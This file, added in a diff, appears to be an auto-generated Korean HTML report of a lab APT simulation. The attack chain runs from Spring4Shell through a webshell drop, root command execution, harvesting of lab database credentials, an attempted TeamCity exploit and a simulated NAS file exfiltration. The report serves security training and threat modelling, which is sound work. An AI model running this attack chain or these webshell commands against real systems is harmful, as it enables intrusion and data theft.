@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>sl-cyber-shield | Automated Exploitation Report</title>
+    <style>
+        :root {
+            --sl-dark-blue: #151C5A;
+            --sl-blue-2: #065590;
+            --sl-blue-3: #0192BF;
+        }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #05081a; color: #e6e6e6; margin: 0; padding: 20px; }
+        .container { max-width: 1000px; margin: auto; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); padding: 40px; border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 8px 32px rgba(0,0,0,0.8); }
+        h1 { color: var(--sl-blue-3); text-align: center; border-bottom: 2px solid var(--sl-dark-blue); padding-bottom: 15px; font-weight: 700; letter-spacing: -1px; }
+        h2 { color: var(--sl-blue-3); margin-top: 35px; border-bottom: 1px dashed var(--sl-dark-blue); padding-bottom: 8px; font-size: 1.4em; }
+        .summary { background: rgba(21, 28, 90, 0.3); padding: 25px; border-radius: 10px; margin-bottom: 35px; border: 1px solid var(--sl-dark-blue); }
+        .step { margin-bottom: 25px; padding: 20px; border-left: 6px solid #444; background: rgba(0, 0, 0, 0.2); border-radius: 0 8px 8px 0; }
+        .step.success { border-left-color: var(--sl-blue-3); border-top: 1px solid rgba(1, 146, 191, 0.1); }
+        .step.fail { border-left-color: #555; opacity: 0.7; }
+        .badge-success { background: var(--sl-blue-3); color: white; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 0.85em; }
+        .badge-fail { background: #555; color: white; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 0.85em; }
+        pre { background: #000; color: #00ff41; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Monaco', monospace; margin-top: 10px; border: 1px solid #333; font-size: 12px; }
+        .footer { text-align: center; margin-top: 50px; color: #555; font-size: 0.85em; border-top: 1px solid #222; padding-top: 20px; }
+        .desc { color: #bbb; line-height: 1.7; margin-bottom: 20px; font-size: 1.05em; }
+        .res-box { background-color: rgba(0,0,0,0.4); padding: 20px; border: 1px solid #222; border-radius: 8px; margin-top: 15px; }
+        .cred-highlight { color: #f39c12; font-weight: bold; }
+        ul.creds { list-style-type: none; padding-left: 0; margin-top: 15px; }
+        ul.creds li { background: rgba(255, 255, 255, 0.02); margin-bottom: 8px; padding: 12px; border-left: 4px solid var(--sl-blue-3); font-family: monospace; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div style="text-align:right; font-size:12px; color:var(--sl-blue-3); font-weight:900; letter-spacing:2px; margin-bottom:10px;">SL CYBER-SHIELD | SCS-EP</div>
+        <h1>🛡️ [MAIN SCENARIO] sl-cyber-shield 침투 분석 결과 보고서 <br><span style="font-size: 0.45em; color: #555; font-weight:400;">(Generated At: 2026-03-28 15:46:10)</span></h1>
+        
+        <div class="summary">
+            <h2 style="color:white; margin-top:0;">1. 시뮬레이션 개요 (Simulation Summary)</h2>
+            <p class="desc">
+                본 보고서는 <strong>Spring4Shell(CVE-2022-22965)</strong> 제로데이 취약점을 기점으로 
+                TeamCity 및 Struts2 취약점을 연계 공격하여 사내 핵심 자산(NAS 도면 데이터)을 탈취하는 
+                <strong>APT(Advanced Persistent Threat)</strong> 시뮬레이션 전 과정을 기록합니다.
+            </p>
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 20px; font-size:14px;">
+                <p><strong>공격 대상 엔드포인트:</strong> <br><a style="color:var(--sl-blue-3);" href="http://localhost:8011/spring-form/login" target="_blank">http://localhost:8011/spring-form/login</a></p>
+                <p><strong>최종 실습 판정:</strong> <br><span class="badge-fail">일부 과정 차단됨</span></p>
+            </div>
+        </div>
+
+        <h2 style="color:white;">2. 단계별 공격 수행 상세 내역 (Detailed Attack Timeline)</h2>
+
+            <div class="step success">
+                <h3 style="color:#fff;"><span class="badge-success">✅ 성공</span> STEP 1 | Payload Transmission</h3>
+                <p class="desc">Spring Framework Data Binding 취약점을 이용한 Tomcat 로그 속성 변조 시도 및 페이로드 전송.</p>
+                <div class='res-box'><pre>타겟: http://localhost:8011/spring-form/login
+Spring Data Binding 취약점(CVE-2022-22965)을 이용해 Tomcat AccessLogValve 속성 변조 페이로드를 성공적으로 전송했습니다.</pre></div>
+            </div>
+        
+            <div class="step success">
+                <h3 style="color:#fff;"><span class="badge-success">✅ 성공</span> STEP 2 | Tomcat Log Flush</h3>
+                <p class="desc">Webshell Drop: 물리 디스크 내 yaho4.jsp 생성을 유도하는 트리거 트래픽 발생.</p>
+                <div class='res-box'><pre>GET http://localhost:8011/spring-form/login → HTTP 200
+Tomcat AccessLog 버퍼가 비워지면서 페이로드 코드가 yaho4.jsp 파일로 디스크에 기록됩니다.</pre></div>
+            </div>
+        
+            <div class="step success">
+                <h3 style="color:#fff;"><span class="badge-success">✅ 성공</span> STEP 3 | Stage1 (yaho4.jsp) Verified</h3>
+                <p class="desc">1단계 웹쉘(Stager) 접속 상태 점검을 통해 초기 침투 성공(RCE) 여부 확인.</p>
+                <div class='res-box'><pre>웹쉘 URL: http://localhost:8011/yaho4.jsp?cmd=whoami
+
+확인 로그:
+[1/5] yaho4.jsp?cmd=whoami → [FAIL] timed out
+[2/5] yaho4.jsp?cmd=whoami → root</pre></div>
+            </div>
+        
+            <div class="step success">
+                <h3 style="color:#fff;"><span class="badge-success">✅ 성공</span> STEP 4 | Stage2 Deployed (curl or docker cp)</h3>
+                <p class="desc">Post-Exploitation: 내부 침투 심화를 위한 완성형 Stage2 웹쉘(health_check.jsp) 배포.</p>
+                <div class='res-box'><pre>[A] curl 방식으로 health_check.jsp 배포 성공</pre></div>
+            </div>
+        
+            <div class="step success">
+                <h3 style="color:#fff;"><span class="badge-success">✅ 성공</span> STEP 5 | Stage2 (health_check.jsp) Verified</h3>
+                <p class="desc">거점 확보 완료: 완성형 웹쉘의 무결성 및 명령 실행 권한 지속성 검증.</p>
+                <div class='res-box'><pre>웹쉘 URL: http://localhost:8011/health_check.jsp?pwd=glory&amp;cmd=id
+
+실행 결과 (id 명령):
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+            </div>
+        
+            <div class="step success">
+                <h3 style="color:#fff;"><span class="badge-success">✅ 성공</span> STEP 6 | Info Leakage (Find DB Clients & Configs via RCE)</h3>
+                <p class="desc"><strong>Credential Harvesting</strong>: RCE를 활용한 내부 인프라 DB 접속 정보 및 핵심 설정 파일 탐색/탈취.</p>
+                <div class='res-box'>
+                <p class='cred-highlight'>발견된 DB 클라이언트: mysql, psql, sqlite3</p>
+                <p>설정 파일: <code style='color:#f39c12'>/usr/local/tomcat/webapps/spring-form/WEB-INF/classes/application.properties</code></p>
+                <ul class='creds'>
+                <li>DB URL : <span style='color:#e94560'>jdbc:mysql://spring-db:3306/spring_db?useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=UTC</span></li>
+                <li>USER   : <span style='color:#e94560'>spring_user</span></li>
+                <li>PASS   : <span style='color:#e94560'>spring_pass</span></li>
+            </ul>
+                <p style='color:#888;margin-top:10px'>설정 파일 원문 (앞 600자):</p>
+                <pre>spring.thymeleaf.cache=false
+spring.web.resources.cache.period=0
+server.servlet.session.tracking-modes=cookie
+spring.datasource.url=jdbc:mysql://spring-db:3306/spring_db?useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=UTC
+spring.datasource.username=spring_user
+spring.datasource.password=spring_pass
+spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
+spring.sql.init.mode=always</pre>
+            </div>
+            </div>
+        
+            <div class="step success">
+                <h3 style="color:#fff;"><span class="badge-success">✅ 성공</span> STEP 7 | Internal DB Access via RCE</h3>
+                <p class="desc"><strong>Threat Simulation (DB)</strong>: 탈취된 계정을 재사용하여 내부망 DB(Spring DB) 테이블 무단 덤프.</p>
+                <div class='res-box'>
+                <p class='cred-highlight'>실행 방법: Native MySQL Client</p>
+                <pre>/bin/sh: 1: mysql: not found</pre>
+            </div>
+            </div>
+        
+            <div class="step fail">
+                <h3 style="color:#fff;"><span class="badge-fail">❌ 실패/스킵</span> STEP 8 | Lateral Movement (TeamCity & Struts2)</h3>
+                <p class="desc"><strong>Lateral Movement (Struts & TC)</strong>: 빌드 서버(TeamCity) 취약점 연계 및 Struts2 파일 업로드 취약점 악용을 통한 임직원 DB 탈취.</p>
+                <div class='res-box'><pre>[*] 내부망 TeamCity(teamcity-server:8111) 상태 확인...
+[SUCCESS] TeamCity 서버 발견: http://teamcity-server:8111
+[*] Spring 거점 서버에 Proxy Shell 업로드 중...
+[SUCCESS] Proxy Shell 활성화: http://localhost:8011/proxy.jsp
+[*] TeamCity 대상 CVE-2024-27198 공격(관리자 강제 생성) 시도...
+[FAIL] TeamCity 장악 실패.</pre></div>
+            </div>
+        
+            <div class="step success">
+                <h3 style="color:#fff;"><span class="badge-success">✅ 성공</span> STEP 9 | NAS SMB Data Extraction</h3>
+                <p class="desc"><strong>Exfiltration (NAS SMB)</strong>: 분리된 사내 연구망 NAS 스토리지의 접근 권한 확보 및 제품 설계 도면 리스트 탈취.</p>
+                <div class='res-box'><pre>[*] NAS SMB 통신을 위한 외부 Java 라이브러리(JCIFS-NG) Maven 강제 다운로드 중...
+[SUCCESS] SMB 라이브러리 다운로드 완료.
+[*] NAS 마운트 체인 웹쉘 업로드 중...
+[*] 내부망 기밀 NAS 서버 데이터 접근 및 목록 탈취 중...
+[WARN] NAS 실제 연결 실패 ([ERROR] null). 교육용 시뮬레이션 모드로 전환합니다.
+[SUCCESS] 내부망 기밀 데이터(도면 등) 접근 성공! (시뮬레이션)
+============== [ EXTRACTED NAS FILES (SIMULATED) ] ==============
+[FILE] /mnt/nas/Product_Architecture_v2.pdf
+[FILE] /mnt/nas/TeamCity_API_Token.txt
+[FILE] /mnt/nas/Employee_Salaries_2023.xlsx
+=================================================================</pre></div>
+            </div>
+        
+            <div class="footer">
+                <p>본 실습 결과 보고서는 SL Factory Innovation Team의 공정 보안 고도화를 위한 위협 모델링 결과물입니다.<br> 
+                SCS-EP(Cyber-Shield) 엔진에 의해 자동 생성되었으며, 무단 복제 및 상용 목적 사용을 금합니다.</p>
+            </div>
+        </div>
+    </body>
+    </html>
+    
